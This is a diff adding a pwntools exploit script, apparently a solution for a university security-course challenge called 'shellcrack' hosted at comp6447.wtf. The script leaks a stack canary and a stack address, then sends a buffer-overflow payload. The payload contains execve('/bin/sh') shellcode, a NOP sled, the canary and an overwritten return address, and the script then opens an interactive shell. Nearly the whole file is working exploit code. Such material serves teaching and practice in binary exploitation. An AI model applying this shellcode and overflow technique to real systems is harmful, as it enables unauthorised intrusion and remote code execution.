@@ -1,0 +1,108 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+from pwn import *
+
+# Set up pwntools for the correct architecture
+context.update(arch='i386')
+exe = './shellcrack' #Change this
+
+PROGNAME = exe
+REMOTE = "comp6447.wtf" #Change this
+REMOTEPORT = 17840 #Change this
+global p
+global e
+global global_timeout
+
+e = ELF(PROGNAME)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+continue
+'''.format(**locals())
+
+if args.REMOTE:
+    global_timeout = 3
+    p = remote(REMOTE, REMOTEPORT)
+else:
+    global_timeout = 0.5
+    p = process(PROGNAME)
+    p = start()
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# esp is subbed 0x40 bytes, our input writes to esp+0x10
+p.recvline()
+# fread reads in 16 entries of size byte. (man page)
+payload = b'a'*16
+payload = payload[:-1]
+log.info(f"payload: {payload}")
+p.sendline(payload)
+# successful leak
+
+log.info(p.recvline())
+canary = p.recvline()
+canary = canary[:-2]
+log.info(f"canary: {canary}")
+# Canary acquired
+
+p.recvuntil(b'[', drop=True)
+stack_addr = p.recvline()
+stack_addr = stack_addr[:-3]
+log.info(f"stack address: {stack_addr}")
+# Stack address acquired
+
+stack_addr = int(stack_addr, 16)
+stack_addr = p32(stack_addr)
+log.info(f"stack address: {stack_addr}")
+# stack address packed
+
+# Shellcode to execve /bin/sh
+my_asm = """
+xor ecx, ecx
+mul ecx
+
+mov eax, 0xb
+push ecx
+push 0x68732f2f
+push 0x6e69622f
+mov ebx, esp
+int 0x80
+"""
+
+# Filler nopsled shellcode
+nop_asm = """
+nop
+"""
+
+nopsled = asm(nop_asm)
+shellcode = asm(my_asm)
+c_len = len(canary)
+log.info(f"canary len: {c_len}")
+# Construct payload
+payload = shellcode
+# We need to write in 30 bytes to get to stack canary
+payload += nopsled * (0x40 - 0x10 - len(shellcode))
+payload += canary
+# We are 9 bytes away from return address (canary len = 9)
+payload += nopsled * (0x58 - 0x40 - len(canary)) 
+payload += stack_addr + b'\n'
+p.sendline(payload)
+p.interactive()
+
